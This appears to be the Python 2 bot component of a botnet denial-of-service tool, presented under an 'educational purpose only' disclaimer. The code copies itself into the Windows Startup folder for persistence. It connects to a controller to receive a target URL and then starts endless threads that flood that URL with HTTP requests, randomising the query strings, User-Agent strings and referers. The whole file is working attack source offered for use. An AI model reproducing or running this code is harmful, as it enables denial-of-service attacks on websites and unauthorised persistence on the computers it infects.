import os
import sys
import urllib2
import socket
import random
import threading, shutil


"""
Educational purpose only             
---------------------------------------------
I'm not responsible for your actions 

Created By: EH30
"""


if sys.platform == "linux" or sys.platform == "linux2":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")
elif sys.platform == "darwin":
    os.system("clear")


class Bot:
    def __init__(self, host, port):
        #super(Bot, self).__init__()
        self.selfcopy()
        self.conn = 0
        while True:
            try:
                self.soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.soc.connect((host, port))
                self.url = self.soc.recv(1026)
                self.conn += 1

                if self.conn == 1:
                    break
            except socket.error:
                pass
            except KeyboardInterrupt:
                pass

    def User_Agent(self):
        global useragent
        useragent = []
        useragent.append("")
        useragent.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
        useragent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
        useragent.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
        useragent.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")

        return useragent

    def User_Refer(self):
        global referer
        referer = []
        referer.append("https://www.google.com")
        referer.append("https://www.ducduckgo.com")
        referer.append("https://youtube.com")

        return referer

    def ascii(self, size):
        out_str = ''

        for e in range(0, size):
            rand = random.randint(65, 90)
            out_str = chr(rand)

        return out_str

    def th1(self):
        while True:
            try:
                urlreq = urllib2.Request(self.url + "?" + self.ascii(random.randint(3, 10)))
                urlreq.add_header("User-Agent", random.choice(self.User_Agent()))
                urlreq.add_header("Referer", random.choice(self.User_Refer()))
                urllib2.urlopen(urlreq)
            except urllib2.HTTPError:
                pass
            except urllib2.URLError:
                sys.exit()
            except ValueError:
                sys.exit()
            except KeyboardInterrupt:
                exit("\033[1;34m [-]Canceled By User \033[1;m")
                sys.exit()

    def selfcopy(self):
        system_locator = os.path.expanduser("~")
        windows_locator = "{0}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup".format(system_locator)
        shutil.copy(sys.executable, windows_locator)

    def HttpTh(self):
        while True:
            th = threading.Thread(target=self.th1)
            th.start()


if __name__ == "__main__":
    print ("\033[1;32m Run dosnet.py script \033[1;m")